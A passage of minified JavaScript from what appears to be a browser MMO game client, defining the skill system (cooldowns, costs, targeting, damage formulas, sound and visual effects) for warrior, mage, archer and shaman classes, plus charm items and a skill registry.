                this.Za[1] = Math.max(this.Za[1], this.getWorldYBody(Ua, this.Za[0], this.Za[2]))
        }
        getWorldYBody(t, e, s) {
            return t.getHeight(e, s)
        }
        distanceV2(t) {
            return xa(Ya, t, yr(Va, this.Za)),
                Ea(Ya)
        }
        distanceV3(t) {
            return tn(Oa, t, this.Za),
                Wi(Oa)
        }
        squaredDistanceV2(t) {
            return xa(Ya, t, yr(Va, this.Za)),
                Ma(Ya)
        }
        squaredDistance(t) {
            return tn(Oa, t, this.Za),
                rn(Oa)
        }
        rotationToV2(t) {
            return xa(Ya, t, yr(Va, this.Za)),
                _a(Ya, Ya),
                mr(Ya)
        }
        rotationToV3(t) {
            return tn(Oa, t, this.Za),
                on(Oa, Oa),
                pr(Oa)
        }
    }
    class iv extends sv {
        constructor(t) {
            super(t),
                this.hudPos = [0, 0, 0],
                this.netDeletion = new fh(0, 0)
        }
        onRemove() {
            this.transform && this.transform.onRemove()
        }
    }
    const nv = (t, e) => "function" == typeof t ? t(e) : t;
    class av {
        constructor(t) {
            this.id = t.id,
                this.cd = void 0 !== t.cd ? t.cd : 0,
                this.cost = t.cost || {},
                this.targetMode = t.targetMode || 0,
                this.onCast = t.onCast,
                this.onPermanent = t.onPermanent,
                this.range = t.range || 0,
                this.graceRange = this.range + Math.min(.2 * this.range, 10),
                this.auto = t.auto || !1,
                this.engineOnly = t.engineOnly || !1,
                this.minlevel = t.minlevel || 0,
                this.castLen = t.castLen || 0,
                this.gcd = void 0 !== t.gcd ? t.gcd : 1.5,
                this.custom = t.custom,
                this.skilllevels = Math.min(5, t.skilllevels || 5),
                this.goldValue = t.goldValue || 0,
                this.noReward = t.noReward || !1,
                this.outOfCombat = t.outOfCombat || !1,
                this.pvpBoundsAdd = t.pvpBoundsAdd || 0,
                this.ignoreGcd = t.ignoreGcd || !1,
                this.ignoreIncapacitated = t.ignoreIncapacitated || !1,
                this.disablingBuffs = t.disablingBuffs || [],
                this.hasteAffected = void 0 === t.hasteAffected || t.hasteAffected,
                this.skillpoints = void 0 !== t.skillpoints ? t.skillpoints : 1
        }
        can(t, e, s = 0, i) {
            if (this.outOfCombat && !t.stats.combatTimer.done(Ua.time))
                return 11;
            if (this.cost.resources && !this.cost.resources.reduce((s, i) => s && t.stats.getResource(i[0]) >= nv(i[1], e), !0))
                return 5;
            if (1 !== this.targetMode) {
                let e = Ua.getEntityById(s);
                const n = void 0 === e || e.stats.alive
                    , a = void 0 === e ? -1 : t.hostility(e);
                if (4096 === this.targetMode) {
                    if ((-1 === a || 0 === a) && n)
                        return 3;
                    if (!t.canCombatInteract(e))
                        return 13
                } else if (256 === this.targetMode) {
                    if ((-1 === a || 0 !== a) && n)
                        return 4
                } else if (16 === this.targetMode)
                    e = t;
                else if (17 === this.targetMode && (void 0 === e || e === t))
                    return 3;
                if (void 0 !== e && !e.stats.alive)
                    return 10;
                if (e && s !== t.id && e !== t && this.range > 0 && !t.combatRangeCheck(e, i ? this.range : this.graceRange))
                    return 6
            }
            return this.disablingBuffs.some(e => t.buffs.tags.get(e).size > 0) ? 12 : 0
        }
    }
    class rv extends av {
        constructor(t) {
            super(t),
                this.fx = t.fx || {},
                this.autoSkillbar = !1 !== t.autoSkillBar
        }
    }
    const ov = (t, e, s, i) => ({
        id: t,
        minlevel: s,
        engineOnly: !1,
        cd: 0,
        custom: i,
        autoSkillBar: !1,
        onPermanent: (t, s) => ({
            id: e,
            mode: 4,
            caster: t.id,
            target: t.id,
            duration: -1,
            stacks: 1,
            level: s
        })
    })
        , lv = (t, e, s, i, n, a, r) => ({
            id: t,
            targetMode: 16,
            minlevel: s,
            cd: n,
            cost: {
                resources: a
            },
            fx: r,
            onCast: (t, s, n) => ({
                id: e,
                mode: 4,
                stacks: 1,
                duration: i,
                caster: t.id,
                target: t.id,
                aoe: {
                    faction: !0,
                    party: !0,
                    circleRadius: 30
                },
                level: s
            })
        })
        , cv = (t, e, s, i, n, a, r, o = 5, l) => ({
            id: t,
            targetMode: 256,
            range: 25,
            minlevel: s,
            cd: n,
            castLen: i,
            cost: {
                resources: r
            },
            fx: l,
            onCast: (t, s, i) => ({
                id: e,
                mode: o,
                stacks: 1,
                caster: t.id,
                target: i,
                refresh: !0,
                duration: a,
                level: s
            })
        })
        , hv = (t, e, s = 0, i = !0, n, a = !1, r = !1, o) => ({
            id: t,
            targetMode: 16,
            cd: e,
            gcd: 0,
            hasteAffected: !1,
            ignoreIncapacitated: a,
            ignoreGcd: !0,
            castLen: s,
            engineOnly: !0,
            outOfCombat: n,
            fx: o
        });
    var dv = new rv(ov(21, 63, 1))
        , uv = new rv({
            id: 2,
            targetMode: 16,
            minlevel: 5,
            cd: 30,
            gcd: 0,
            cost: {
                resources: [[7, t => 3 + 5 * t]]
            },
            onCast: (t, e, s) => ({
                id: 44,
                mode: 4,
                stacks: 1,
                duration: 9,
                caster: t.id,
                target: t.id,
                level: e
            })
        });
    const mv = t => .7 + .2 * t
        , pv = t => mv(t) + 2;
    var fv = new rv({
        id: 33,
        targetMode: 17,
        skilllevels: 1,
        minlevel: 11,
        cd: 15,
        range: 25,
        disablingBuffs: [4],
        cost: {
            resources: [[7, t => 12]]
        },
        custom: [[mv, "s stunned at min range"], [pv, "s stunned at max range"]],
        onCast: (t, e, s) => { }
    })
        , gv = new rv(lv(20, 62, 15, 300, 150, [[7, t => 8 * t]]))
        , vv = new rv({
            id: 18,
            cd: 0,
            minlevel: 8,
            autoSkillBar: !1,
            fx: {
                effectDirImpact: [_f.meleeSlash],
                impactSound: {
                    distance: 5,
                    id: "warrior/bleedImpact",
                    rndDelay: !0,
                    delay: .3
                }
            },
            onPermanent: (t, e) => ({
                id: 59,
                mode: 4,
                caster: t.id,
                target: t.id,
                duration: -1,
                stacks: 1,
                level: e
            })
        })
        , yv = new rv({
            id: 3,
            targetMode: 1,
            minlevel: 3,
            cd: 6,
            cost: {
                resources: [[7, t => 2 + 2 * t]]
            },
            fx: {
                animCast: {
                    id: 4,
                    dur: .8,
                    sounds: [{
                        delay: .1,
                        distance: 6,
                        id: "warrior/crescent"
                    }]
                },
                impactSound: t => ({
                    delay: .1 + .3 * Math.random(),
                    distance: 4,
                    id: "warrior/crescent_hit"
                }),
                effectDirImpact: [_f.meleeSlash, _f.meleeFlash],
                effectCast: [_f.crescentStrike],
                weaponRibbon: {
                    steps: 10,
                    interval: .02,
                    timer: 1,
                    a: [.3, 1, 0],
                    b: [-.3, 0, 0],
                    uvTop: .5,
                    Xj: [2, .5, .5, 3],
                    Zw: [1, 0, 0, 0]
                }
            },
            onCast: (t, e, s) => ({
                id: 3,
                mode: 0,
                caster: t.id,
                dmg: t.stats.getDamageRoll() * (1 + .17 * e),
                type: 1,
                aoe: {
                    faction: !1,
                    circleRadius: 5
                }
            })
        })
        , bv = new rv({
            id: 17,
            targetMode: 16,
            minlevel: 21,
            cd: 25,
            gcd: 0,
            cost: {
                resources: [[7, t => 8 * t]]
            },
            fx: {
                effectTarget: [_f.gainHealth]
            },
            onCast: (t, e, s) => ({
                id: 58,
                mode: 4,
                stacks: 1,
                duration: 10,
                caster: t.id,
                target: t.id,
                level: e
            })
        });
    var wv = new rv({
        id: 1,
        targetMode: 4096,
        minlevel: 1,
        cd: 1,
        range: 1.85,
        custom: [[t => 8 * t, "% chance to daze target for 3 seconds"]],
        cost: {
            resources: [[7, t => 1 + t]]
        },
        fx: {
            animCast: {
                id: 1,
                dur: .8,
                sounds: [{
                    delay: .1,
                    distance: 4,
                    id: "woosh1"
                }]
            },
            impactSound: {
                distance: 5,
                id: "warrior/slash",
                delay: .3
            },
            effectDirImpact: [_f.meleeFlash, _f.meleeSlash],
            weaponRibbon: {
                steps: 9,
                interval: .03,
                timer: .5,
                a: [.3, .7, 0],
                b: [-.3, .2, 0],
                uvTop: .8,
                Xj: [1, 1, 0, 2.5],
                Zw: [1, 0, 0, .7]
            }
        },
        onCast: (t, e, s) => {
            const i = 5 + t.stats.getDamageRoll() * (.36 + .36 * e);
            return {
                id: 1,
                mode: 0,
                caster: t.id,
                target: s,
                dmg: i,
                type: 1
            }
        }
    });
    const xv = t => Math.round(200 + t ** 1.2 * 100)
        , kv = (t, e) => {
            1 === e.type && (e.resetAllAggro(),
                e.addAggro(t.caster, xv(t.level)))
        }
        ;
    var $v = new rv({
        id: 34,
        targetMode: 1,
        minlevel: 6,
        cd: 15,
        cost: {
            resources: [[7, t => 4 * t]]
        },
        fx: {
            animCast: {
                id: 9,
                dur: .7
            },
            effectCast: [_f.taunt]
        },
        custom: [[xv, " aggro generation"]],
        onCast: (t, e, s) => ({
            custom: kv,
            id: 75,
            mode: 4,
            stacks: 1,
            caster: t.id,
            duration: .6 + .2 * e,
            level: e,
            aoe: {
                faction: !1,
                circleRadius: 10
            }
        })
    })
        , Sv = new rv({
            id: 41,
            targetMode: 16,
            minlevel: 25,
            cd: 30,
            skilllevels: 1,
            gcd: 0,
            cost: {
                resources: [[7, t => 3 + 5 * t]]
            },
            onCast: (t, e, s) => { }
        })
        , Ev = new rv(lv(19, 61, 18, 300, 150, [[7, t => 8 * t]]))
        , Mv = new rv(lv(22, 64, 17, 300, 120, [[7, t => 5 + 10 * t]]))
        , _v = new rv(cv(24, 66, 15, 1.5, 0, 300, [[7, t => 2 + 3 * t]], 4, {
            animCast: {
                id: 9,
                dur: .7,
                sounds: [{
                    delay: .1,
                    distance: 4,
                    id: "magic/genericcast"
                }]
            },
            animTimedSound: {
                distance: 3,
                loop: !0,
                id: "magic/casting"
            },
            animTimedCast: {
                id: 5
            }
        }))
        , Cv = new rv({
            id: 14,
            targetMode: 1,
            minlevel: 3,
            cd: 20,
            cost: {
                resources: [[7, t => 4 * t]]
            },
            fx: {
                animCast: {
                    id: 9,
                    dur: .6
                },
                effectCast: [_f.icenova]
            },
            onCast: (t, e, s) => ({
                id: 55,
                mode: 4,
                stacks: 1,
                caster: t.id,
                duration: 6,
                level: e,
                aoe: {
                    faction: !1,
                    circleRadius: 8
                }
            })
        })
        , Tv = new rv({
            id: 16,
            targetMode: 16,
            minlevel: 13,
            cd: 45,
            gcd: 0,
            fx: {
                animCast: {
                    id: 9,
                    dur: .8
                }
            },
            onCast: (t, e, s) => ({
                id: 57,
                mode: 4,
                stacks: 1,
                duration: 12,
                caster: t.id,
                target: t.id,
                level: e
            })
        })
        , Pv = new rv({
            id: 4,
            targetMode: 4096,
            range: 25,
            minlevel: 1,
            cd: 0,
            castLen: 1.5,
            cost: {
                resources: [[7, t => 1 + 2 * t]]
            },
            fx: {
                animCast: {
                    id: 6,
                    dur: .7,
                    sounds: [{
                        delay: .1,
                        distance: 3,
                        id: "mage/icecast1"
                    }]
                },
                effectDirImpact: [_f.iceimpact],
                animTimedSound: {
                    distance: 3,
                    loop: !0,
                    id: "magic/casting"
                },
                animTimedCast: {
                    id: 5,
                    effect: _f.icecast
                },
                effectMissile: _f.icebolt
            },
            onCast: (t, e, s) => ({
                id: 4,
                mode: 6,
                speed: 25,
                caster: t.id,
                target: s,
                dmg: 5 + t.stats.getDamageRoll() * (.38 + .38 * e),
                type: 1
            }),
            onPermanent: (t, e, s) => ({
                id: 87,
                mode: 4,
                stacks: 1,
                duration: -1,
                caster: t.id,
                target: t.id,
                level: e
            })
        });
    const Iv = t => 3 + t;
    var Dv = new rv({
        id: 23,
        targetMode: 16,
        minlevel: 5,
        cd: 60,
        gcd: 0,
        cost: {
            resources: [[7, t => 5 * t]]
        },
        custom: [[Iv, " attacks blocked"]],
        fx: {
            animCast: {
                id: 9,
                dur: .8,
                sounds: [{
                    delay: .01,
                    distance: 4,
                    id: "mage/iceshieldcast"
                }]
            }
        },
        onCast: (t, e, s) => ({
            id: 65,
            mode: 4,
            stacks: Iv(e),
            duration: 60,
            caster: t.id,
            target: t.id,
            level: e
        })
    })
        , Av = new rv({
            id: 15,
            targetMode: 1,
            range: 25,
            minlevel: 8,
            cd: 15,
            castLen: 1.5,
            cost: {
                resources: [[7, t => 5 + 5 * t]]
            },
            fx: {
                animCast: {
                    id: 6,
                    dur: .6
                },
                effectDirImpact: [_f.icicleImpact],
                animTimedSound: {
                    distance: 3,
                    loop: !0,
                    id: "magic/casting"
                },
                animTimedCast: {
                    id: 5,
                    effect: _f.icecast
                },
                effectMissile: _f.icicle
            },
            onCast: (t, e, s) => ({
                id: 15,
                mode: 6,
                speed: 10,
                timeout: 2.5,
                caster: t.id,
                rot: t.rot,
                dmg: 10 + t.stats.getDamageRoll() * (.6 + .67 * e),
                type: 1,
                aoe: {
                    circleRadius: 4 + .5 * e,
                    faction: !1,
                    onlyOnce: []
                }
            })
        });
    const Bv = () => 12;
    var Rv = new rv({
        id: 32,
        targetMode: 1,
        skilllevels: 1,
        minlevel: 5,
        gcd: .7,
        cd: 12,
        disablingBuffs: [4],
        cost: {
            resources: [[7, t => 4 * t]]
        },
        fx: {
            animCast: {
                id: 9,
                dur: .8
            },
            effectCast: [_f.teleport]
        },
        custom: [[Bv, "m distance"]],
        onCast: (t, e, s) => { }
    })
        , zv = new rv({
            id: 37,
            targetMode: 4096,
            range: 25,
            minlevel: 15,
            cd: 40,
            castLen: 2.3,
            cost: {
                resources: [[7, t => 5 + 5 * t]]
            },
            fx: {
                animCast: {
                    id: 6,
                    dur: .6,
                    sounds: [{
                        delay: .1,
                        distance: 4,
                        id: "magic/genericcast"
                    }, {
                        delay: 1,
                        distance: 3,
                        id: "shaman/agonizeImpact"
                    }]
                },
                effectDirImpact: [_f.decayImpact],
                animTimedSound: {
                    distance: 3,
                    loop: !0,
                    id: "magic/casting"
                },
                animTimedCast: {
                    id: 5,
                    effect: _f.naturecast
                }
            },
            onCast: (t, e, s) => ({
                id: 77,
                mode: 4,
                stacks: 1,
                caster: t.id,
                target: s,
                duration: 2.5 + .7 * e,
                level: e
            })
        })
        , Fv = new rv(lv(28, 70, 12, 15, 60, [[7, t => 1 + 3 * t]], {
            animCast: {
                id: 6,
                dur: .6,
                sounds: [{
                    delay: .1,
                    distance: 4,
                    id: "magic/genericcast"
                }]
            },
            animTimedSound: {
                distance: 3,
                loop: !0,
                id: "magic/casting"
            },
            animTimedCast: {
                id: 5,
                effect: _f.naturecast
            }
        }))
        , Zv = new rv({
            id: 12,
            targetMode: 4096,
            range: 20,
            minlevel: 1,
            castLen: 0,
            cd: 3,
            cost: {
                resources: [[7, t => Math.round(1 + 4.5 * t)]]
            },
            fx: {
                animCast: {
                    id: 9,
                    dur: .7,
                    sounds: [{
                        delay: .05,
                        distance: 4,
                        id: "shaman/decayCast"
                    }]
                },
                effectDirImpact: [_f.decayImpact],
                effectMissile: _f.decayMissile
            },
            onCast: (t, e, s) => ({
                id: 12,
                mode: 6,
                dmg: 5 + t.stats.getDamageRoll() * (.03 + .13 * e),
                type: 1,
                speed: 15,
                caster: t.id,
                target: s,
                level: e
            })
        })
        , Uv = new rv({
            id: 30,
            targetMode: 1,
            range: 25,
            minlevel: 18,
            cd: 60,
            castLen: 2.3,
            cost: {
                resources: [[7, t => 10 + 8 * t]]
            },
            fx: {
                effectDirImpact: [_f.gainHealthTotem],
                animCast: {
                    id: 9,
                    dur: 1,
                    sounds: [{
                        delay: .1,
                        distance: 4,
                        id: "shaman/healingtotemcast"
                    }]
                },
                animTimedSound: {
                    distance: 3,
                    loop: !0,
                    id: "magic/casting"
                },
                animTimedCast: {
                    id: 5,
                    effect: _f.naturecast
                },
                effectMissile: _f.healingtotem
            },
            onCast: (t, e, s) => ({
                id: 30,
                mode: 6,
                speed: 0,
                timeout: 30,
                caster: t.id,
                rot: t.rot,
                interval: new fh(0, 1),
                heal: t.stats.getDamageRoll() * (.04 + .025 * e),
                type: 1,
                aoe: {
                    circleRadius: 10,
                    circleHeight: 30,
                    faction: !0,
                    party: !0
                }
            })
        })
        , Lv = new rv(lv(13, 54, 6, 15, 120, []))
        , Nv = new rv({
            id: 6,
            targetMode: 256,
            range: 25,
            minlevel: 8,
            cd: 8,
            castLen: 0,
            cost: {
                resources: [[7, t => 4 + 4 * t]]
            },
            fx: {
                animCast: {
                    id: 9,
                    dur: .6,
                    sounds: [{
                        delay: .1,
                        distance: 4,
                        id: "magic/genericcast"
                    }]
                },
                effectTarget: [_f.natureHealOneshot]
            },
            onCast: (t, e, s) => ({
                id: 6,
                mode: 2,
                caster: t.id,
                target: s,
                heal: 15 + t.stats.getDamageRoll() * (.25 + .11 * e)
            })
        });
    var Ov = new rv(ov(43, 94, 3, [[t => 1 + 2 * t, "% haste per stack"], [t => 1 + 2 * t, " jumps"]]))
        , jv = new rv(cv(7, 46, 3, 1.8, 0, 12, [[7, t => 3 + 3 * t]], 5, {
            animCast: {
                id: 9,
                dur: .8,
                sounds: [{
                    delay: .1,
                    distance: 4,
                    id: "magic/genericcast"
                }]
            },
            animTimedSound: {
                distance: 3,
                loop: !0,
                id: "magic/casting"
            },
            animTimedCast: {
                id: 5,
                effect: _f.naturecast
            }
        }));
    var qv = new rv({
        id: 42,
        targetMode: 1,
        minlevel: 8,
        cd: 8,
        castLen: 0,
        range: 20,
        custom: [[t => Math.round(1.3 * t), " mana gained per soul"]],
        cost: {
            resources: [[7, t => 1 + 3 * t]]
        },
        fx: {
            animCast: {
                id: 9,
                dur: 1,
                sounds: [{
                    delay: .05,
                    distance: 4,
                    id: "shaman/soulHarvestCast"
                }]
            },
            effectDirImpact: [_f.soulHarvestImpact],
            effectCast: [_f.soulHarvestCast]
        },
        onCast: (t, e, s) => ({
            id: 42,
            mode: 1,
            caster: t.id,
            target: s,
            type: 1,
            dmg: 4 + t.stats.getDamageRoll() * (.2 + .3 * e),
            level: e
        })
    })
        , Xv = new rv({
            id: 104,
            engineOnly: !0,
            cd: 0,
            fx: {
                effectDirImpact: [_f.soulHarvestReturn],
                effectMissile: _f.soulHarvestMissile
            }
        })
        , Hv = new rv({
            id: 36,
            targetMode: 16,
            minlevel: 10,
            cd: 30,
            gcd: 0,
            cost: {
                resources: [[7, t => 8 + 2 * t]]
            },
            onCast: (t, e, s) => ({
                id: 76,
                mode: 4,
                stacks: 1,
                duration: 17 + 3 * e,
                caster: t.id,
                target: t.id,
                level: e
            })
        })
        , Kv = new rv({
            id: 35,
            targetMode: 1,
            skilllevels: 1,
            minlevel: 5,
            cd: 120,
            castLen: 5,
            outOfCombat: !0,
            hasteAffected: !1,
            pvpBoundsAdd: 5,
            cost: {
                resources: [[7, t => 20 + 5 * t]]
            },
            fx: {
                animCast: {
                    id: 9,
                    dur: 1,
                    sounds: [{
                        delay: .1,
                        distance: 4,
                        id: "magic/summoncast"
                    }]
                },
                animTimedSound: {
                    distance: 3,
                    loop: !0,
                    id: "magic/casting"
                },
                animTimedCast: {
                    id: 5,
                    effect: _f.purplecast
                }
            },
            onCast: (t, e, s) => { }
        })
        , Wv = new rv(ov(26, 68, 15));
    var Yv = new rv({
        id: 11,
        targetMode: 16,
        minlevel: 7,
        cd: 50,
        gcd: 0,
        fx: {
            animCast: {
                id: 9,
                dur: .8
            }
        },
        custom: [[t => 3 + 5 * t, "% of max mp recovered"]],
        onCast: (t, e, s) => ({
            id: 52,
            mode: 4,
            stacks: 1,
            duration: 17,
            caster: t.id,
            target: t.id,
            level: e
        })
    })
        , Vv = new rv(lv(27, 69, 12, 8, 100, [[7, t => 5 + 7 * t]]))
        , Gv = new rv({
            id: 29,
            cd: 0,
            minlevel: 9,
            autoSkillBar: !1,
            fx: {
                effectDirImpact: [_f.poisonImpact],
                impactSound: {
                    distance: 5,
                    id: "warrior/bleedImpact",
                    rndDelay: !0,
                    delay: .3
                }
            },
            onPermanent: (t, e) => ({
                id: 71,
                mode: 4,
                caster: t.id,
                target: t.id,
                duration: -1,
                stacks: 1,
                level: e
            })
        })
        , Qv = new rv({
            id: 9,
            targetMode: 4096,
            range: 25,
            minlevel: 3,
            cd: 6,
            castLen: 1.7,
            cost: {
                resources: [[7, t => 2 + 3 * t]]
            },
            fx: {
                animCast: {
                    id: 7,
                    dur: .3,
                    pre: .1,
                    sounds: [{
                        delay: .005,
                        distance: 5,
                        id: "archer/preciseshot"
                    }]
                },
                impactSound: {
                    delay: .01,
                    distance: 6,
                    id: "archer/preciseimpact"
                },
                effectDirImpact: [_f.arrowPreciseImpact],
                animTimedSound: {
                    distance: 2.5,
                    loop: !0,
                    id: "magic/casting"
                },
                animTimedCast: {
                    id: 5
                },
                effectMissile: _f.precisearrow
            },
            onCast: (t, e, s) => ({
                id: 9,
                mode: 6,
                speed: 120,
                caster: t.id,
                target: s,
                dmg: 5 + t.stats.getDamageRoll() * (.7 + .55 * e),
                type: 1
            })
        })
        , Jv = new rv({
            id: 10,
            targetMode: 16,
            minlevel: 5,
            cd: 0,
            autoSkillBar: !1,
            onPermanent: (t, e, s) => ({
                id: 51,
                mode: 4,
                stacks: 1,
                duration: -1,
                caster: t.id,
                target: t.id,
                level: e
            })
        })
        , ty = new rv({
            id: 38,
            targetMode: 16,
            minlevel: 5,
            skilllevels: 1,
            cd: 10,
            gcd: 0,
            disablingBuffs: [4],
            cost: {
                resources: [[7, t => 6]]
            },
            fx: {
                animCast: {
                    id: 10,
                    dur: .3
                }
            },
            onCast: (t, e, s) => !0
        })
        , ey = new rv({
            id: 31,
            targetMode: 4096,
            range: 25,
            minlevel: 1,
            cd: 0,
            castLen: 1.5,
            cost: {
                resources: [[7, t => 1 + 1 * t]]
            },
            fx: {
                animCast: {
                    id: 7,
                    dur: .3,
                    pre: .1,
                    sounds: [{
                        delay: .005,
                        distance: 5,
                        id: "archer/swiftshot"
                    }]
                },
                impactSound: {
                    delay: .01,
                    distance: 6,
                    id: "archer/swiftimpact"
                },
                effectDirImpact: [_f.arrowPreciseImpact],
                effectMissile: _f.swiftarrow,
                animTimedSound: {
                    distance: 2.5,
                    loop: !0,
                    id: "magic/casting"
                },
                animTimedCast: {
                    id: 5
                }
            },
            onCast: (t, e, s) => ({
                id: 31,
                mode: 6,
                speed: 60,
                caster: t.id,
                target: s,
                dmg: 5 + t.stats.getDamageRoll() * (.28 + .28 * e),
                type: 1
            })
        })
        , sy = new rv(lv(25, 67, 18, 300, 120, [[7, t => 5 + 5 * t]]));
    const iy = {
        medalValue: 1e3,
        goldValue: 5e4,
        buyElo: 1600,
        quality: 90,
        level: 45,
        uniqueEquipped: !0
    }
        , ny = [{
            id: 0,
            custom: ["Use: Removes all movement limiting effects."],
            useCd: 60,
            incap: !0,
            effectCast: [_f.removeCC],
            use: (t, e, s, i) => { }
        }, {
            id: 1,
            custom: ["Use: Protects you against 30% of incoming damage for 10 seconds."],
            useCd: 60,
            incap: !1,
            use: (t, e, s, i) => { }
        }, {
            id: 2,
            custom: ["Use: Increases your damage by 20% for 10 seconds."],
            useCd: 80,
            incap: !1,
            use: (t, e, s, i) => { }
        }, {
            id: 3,
            custom: ["Use: Speeds up your movement by 45 for 8 seconds."],
            useCd: 50,
            incap: !1,
            use: (t, e, s, i) => { }
        }, {
            id: 4,
            custom: ["Use: Attacks made against you grant 20 MP (up to 200) for 20 seconds."],
            useCd: 60,
            incap: !1,
            use: (t, e, s, i) => { }
        }]
        , ay = t => {
            ny.forEach((e, s) => {
                t["charm" + e.id] = {
                    ...iy,
                    ...e,
                    type: "charm",
                    tier: e.id,
                    useSkill: 105 + s
                }
            }
            )
        }
        , ry = new rv(hv(100, 30, 0, !0, !0, !1, !1, {
            animCast: {
                id: 3,
                dur: 1,
                sounds: [{
                    delay: .1,
                    distance: 5,
                    id: "potion1"
                }]
            },
            effectTarget: [_f.potionConsume]
        }))
        , oy = new rv(hv(101, 1.5, 0, !0, !1, !1, !1))
        , ly = new rv(hv(103, 1.5, 3, !0, !1, !1, !1, {
            animCast: {
                id: 9,
                dur: .8,
                sounds: [{
                    delay: .1,
                    distance: 5,
                    id: "item/boxopening"
                }]
            },
            animTimedSound: {
                distance: 3,
                loop: !0,
                id: "magic/casting"
            },
            animTimedCast: {
                id: 5
            }
        }))
        , cy = new rv(hv(102, 1.5, 1.5, !1, !0, !1, !1, {
            animCast: {
                id: 9,
                dur: .8
            },
            animTimedSound: {
                distance: 3,
                loop: !0,
                id: "magic/casting"
            },
            animTimedCast: {
                id: 5
            }
        }))
        , hy = ny.map((t, e) => new rv(hv(105 + e, t.useCd, 0, !1, !1, t.incap, !0, {
            animCast: {
                id: 9,
                dur: .8,
                sounds: [{
                    delay: .05,
                    distance: 4,
                    id: "item/charm" + e
                }]
            },
            effectCast: t.effectCast
        }))).reduce((t, e) => ({
            ...t,
            ["charm" + e.id]: e
        }), {});
    var dy = new rv({
        id: 5,
        targetMode: 4096,
        range: 25,
        engineOnly: !0,
        auto: !0,
        cd: t => 100 / t.stats.getStat(17),
        fx: {
            animCast: {
                id: 8,
                dur: .4,
                sounds: [{
                    delay: .01,
                    distance: 5,
                    id: "archer/arrow_release1"
                }]
            },
            impactSound: {
                delay: .01,
                distance: 4,
                id: "archer/arrow_impact1"
            },
            effectDirImpact: [_f.arrowImpact],
            effectMissile: _f.arrow
        },
        onCast: (t, e, s) => ({
            id: 5,
            mode: 6,
            speed: 30,
            caster: t.id,
            target: s,
            dmg: t.stats.getDamageRoll(),
            type: 0
        })
    })
        , uy = new rv({
            id: 0,
            targetMode: 4096,
            engineOnly: !0,
            auto: !0,
            range: 1,
            cd: t => 100 / t.stats.getStat(17),
            fx: {
                animCast: {
                    id: 0,
                    dur: 1,
                    sounds: [{
                        delay: .3,
                        distance: 5,
                        id: "woosh1"
                    }]
                },
                impactSound: t => t.transform.sounds.melee,
                impactSoundPitchCaster: !0,
                effectDirImpact: [_f.meleeFlash, _f.meleePhys]
            },
            onCast: (t, e, s) => ({
                id: 0,
                mode: 0,
                caster: t.id,
                target: s,
                dmg: t.stats.getDamageRoll(),
                type: 0
            })
        })
        , my = new rv({
            id: 39,
            engineOnly: !1,
            skilllevels: 1,
            minlevel: 30,
            cd: 0,
            goldValue: 25e3,
            skillpoints: 0,
            noReward: !0,
            autoSkillBar: !1
        });
    const py = {
        ...hy,
        recall: new rv({
            id: 40,
            targetMode: 1,
            engineOnly: !0,
            cd: 300,
            castLen: 5,
            outOfCombat: !0,
            hasteAffected: !1,
            cost: {
                resources: [[7, t => 20 + 5 * t]]
            },
            fx: {
                animCast: {
                    id: 9,
                    dur: .6
                },
                animTimedSound: {
                    distance: 3,
                    loop: !0,
                    id: "magic/casting"
                },
                animTimedCast: {
                    id: 5,
                    effect: _f.purplecast
                }
            },
            onCast: (t, e, s) => { }
        }),
        arrow: dy,
        melee: uy,
        potion: ry,
        book: oy,
        specialization: new rv({
            id: 8,
            engineOnly: !0,
            cd: 0,
            onPermanent: (t, e) => ({
                id: t.class + 47,
                mode: 4,
                caster: t.id,
                target: t.id,
                duration: -1,
                stacks: 1,
                level: e
            })
        }),
        mount: my,
        activatemount: cy,
        container: ly
    }
        , fy = {
            temper: Sv,
            taunt: $v,
            charge: fv,
            warcry: Ev,
            courage: gv,
            armorreinforcement: dv,
            healOnBlock: bv,
            slash: wv,
            blockBuff: uv,
            crescentStrike: yv,
            crescentBleed: vv
        }
        , gy = {
            teleport: Rv,
            enchantment: _v,
            arcticaura: Mv,
            iceshield: Dv,
            hypothermic: Tv,
            frostnova: Cv,
            icebolt: Pv,
            icicle: Av
        }
        , vy = {
            snipe: ty,
            poisonarrows: Gv,
            temporaldilation: sy,
            pathfinding: Vv,
            preciseShot: Qv,
            serpentArrows: Jv,
            invigorate: Yv,
            swiftshot: ey,
            cranialpunctures: Wv
        }
        , yy = {
            soulharvestReturn: Xv,
            plaguespreader: Ov,
            soulharvest: qv,
            agonize: zv,
            caninehowl: Fv,
            mana: Lv,
            mend: Nv,
            revitalize: jv,
            decay: Zv,
            healingtotem: Uv,
            summon: Kv,
            spiritanimal: Hv
        }
        , by = new Map;
    [fy, gy, vy, yy, py].forEach((t, e) => {
        for (const s in t)
            e <= 3 && (t[s].class = e),
                by.set(t[s].id, t[s])
    }
    ),
        by.set(10044, new rv({
            id: 10044,
            engineOnly: !0
        }));
    class wy {
        constructor(t) {
            this.entity = t,
                this.skills = new Map,
                this.skillIds = [],
                this.timedCast = new fh,
                this.timedSkill = void 0,
                this.timedTarget = void 0,
                this.pvpBoundModifier = 0
        }
        tick(t, e, s) { }
        add(t, e = 0, s = 0, i) {
            let n = this.skills.get(t);
            return n = Object.assign(n || {}, {
                level: void 0 !== i ? i : n ? n.level + 1 : 1,
                logic: by.get(t),
                cd: new fh(e, s - e)
            }),
                this.skills.set(t, n),
                n
        }
        remove(t) {
            this.skills.delete(t)
        }
        compileSkillIds() {
            this.skillIds.length = 0,
                this.skills.forEach((t, e) => {
                    if (!t.logic.engineOnly)
                        for (let s = 0; s < t.level; ++s)
                            this.skillIds.push(e)
                }
                )
        }
        globalCd(t, e) {
            this.skills.forEach(s => {
                s.logic.auto || s.logic.ignoreGcd || (s.cd.end < t && (s.cd.start = t),
                    s.cd.end < e && (s.cd.end = e))
            }
            )
        }
        startTimedCast(t, e, s, i) {
            this.timedCast.reset(e, i),
                this.timedSkill = t,
                this.timedTarget = s,
                this.entity.steer[0] = 0,
                this.entity.steer[1] = 0,
                this.pvpBoundModifier = by.get(t.id).pvpBoundsAdd
        }
        interruptTimedCast() {
            this.timedCast.reset(0, 0),
                this.timedSkill = void 0,
                this.timedTarget = void 0,
                this.pvpBoundModifier = 0
        }
        finishTimedCast(t) {
            return this.interruptTimedCast(!1)
        }
        onDeath() {
            this.interruptTimedCast(!0)
        }
        clear() { }
        hasInstantCast(t) {
            return this.entity.buffs.instantCast.size > 0 && Array.from(this.entity.buffs.instantCast).some(e => e.logic.instantCast.has(t))
        }
    }
    const xy = new Map;
    class ky extends wy {
        constructor(t) {
            super(t)
        }
        tick(t, e, s) {
            if (super.tick(t, e, s),
                this.isPlayer) {
